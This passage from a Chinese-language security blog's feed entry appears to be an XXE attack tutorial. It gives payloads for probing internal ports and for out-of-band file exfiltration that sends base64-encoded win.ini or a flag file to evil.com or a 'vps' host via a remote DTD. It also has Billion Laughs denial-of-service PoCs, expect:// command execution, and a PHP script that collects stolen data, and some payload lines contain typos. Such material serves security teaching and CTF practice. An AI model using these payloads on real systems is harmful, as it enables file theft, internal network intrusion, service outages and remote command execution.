version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY[  </span><br><span class="line">&lt;!ENTITY port file SYSTEM &quot;http://192.168.0.1:80&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;p&gt;&amp;port;&lt;/p&gt;</span><br><span class="line">EOF;</span><br><span class="line"></span><br><span class="line">$data = simplexml_load_string($xml) ;</span><br><span class="line">echo &quot;&lt;pre&gt;&quot; ;</span><br><span class="line">print_r ($data);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>通过DTD参数实体的特性将文件内容拼接到url</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE root[   </span><br><span class="line"> &lt;!ENTITY % file SYSTEM &quot;php://fileter/convert.base64-encode/resource=c:/windows/win.ini&quot;&gt;   </span><br><span class="line"> &lt;!ENTITY % dtd SYSTEM &quot;http://192.168.1.100:8000/evil.dtd&quot;&gt;    </span><br><span class="line"> %dtd;      </span><br><span class="line"> %send;</span><br><span class="line"> ]&gt; </span><br><span class="line"> &lt;root&gt;&lt;/root&gt;</span><br></pre></td></tr></table></figure><p> evil.dtd:</p><p> <code>&lt;!ENTITY % payload &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#39;http://evil.com/?content=%file;&#39;&gt;&quot;&gt; %payload;</code></p><p> evil.dtd中将%file实体的内容拼接到url后，然后利用burp等工具，查看url请求就能获得需要的内容</p><p> <strong>攻击内网网站</strong></p><p>利用xxe像内网机器发出payload请求即可</p><p> <strong>dos攻击</strong></p><p> Billion Laughs 攻击</p><blockquote><p>Billion laughs attack，xml解析的时候，<lolz></lolz>中间将是一个十亿级别大小的参数，将会消耗掉系统30亿字节的内存。</p></blockquote><p>POC:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version = &quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE lolz [</span><br><span class="line">&lt;!ENTITY lol &quot;lol&quot;&gt;</span><br><span class="line">&lt;!ELEMENT lolz (#PCDATA)&gt;</span><br><span class="line">&lt;!ENTITY lol1 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol2 &quot;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol4 &quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol5 &quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;&gt;</span><br><span class="line">    &lt;!ENTITY lol6 &quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol7 &quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol8 &quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol9 &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt;]&gt;</span><br><span class="line">&lt;lolz&gt;&amp;lol9;&lt;/lolz&gt;</span><br></pre></td></tr></table></figure><p>或者：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE data [</span><br><span class="line">&lt;!ENTITY a0 &quot;dos&quot; &gt;</span><br><span class="line">&lt;!ENTITY a1 &quot;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&quot;&gt;</span><br><span class="line">&lt;!ENTITY a2 &quot;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&quot;&gt;</span><br><span class="line">&lt;!ENTITY a3 &quot;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&quot;&gt;</span><br><span class="line">&lt;!ENTITY a4 &quot;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;data&gt;&amp;a4;&lt;/data&gt;</span><br></pre></td></tr></table></figure><blockquote><p>POC中中先定义了lol实体，值为”lol”的字符串,后在下面又定义了lol2实体，lol2实体引用10个lol实体，lol3又引用了10个lol2实体的值，依此类推，到了最后在lolz元素中引用的lol9中，就会存在上亿个”lol”字符串<br>此时解析数据时未做特别处理，即可能造成拒绝服务攻击。</p></blockquote><blockquote><p>此外还有一种可能造成拒绝服务的Payload,借助读取/dev/random实现.</p></blockquote><p><strong>远程命令执行</strong></p><p>需要PHP的expect扩展</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$xml=&lt;&lt;&lt;EOF</span><br><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY[</span><br><span class="line">&lt;!ENTIT ex SYSTEM &quot;expect://whoami&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;p&gt;&amp;ex;&lt;/p&gt;</span><br><span class="line">EOF;</span><br><span class="line"></span><br><span class="line">$data = simplexml_load_string($xml) ;</span><br><span class="line">echo &quot;&lt;pre&gt;&quot; ;</span><br><span class="line">print_r ($data);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>无回显情况：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE ANY[</span><br><span class="line">&lt;!ENTITY % r SYSTEM &quot;http://vps/e.xml&quot;&gt;</span><br><span class="line">%r;</span><br><span class="line">%all;</span><br><span class="line">%s;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure><p>e.xml:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % f SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///flag&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;!ENTITY % all &quot;&lt;!ENTITY % s SYSTEM &apos;http://vps/xxe.php?f=%f;&apos;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure><p>xxe.php:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">file_put_contents(&quot;flag.txt&quot;, $_GET[&apos;f&apos;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;点击阅读&lt;/p&gt;
    
    </summary>
    
    
      <category term="代码注入" scheme="http://j0k3r.top/tags/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
</feed>
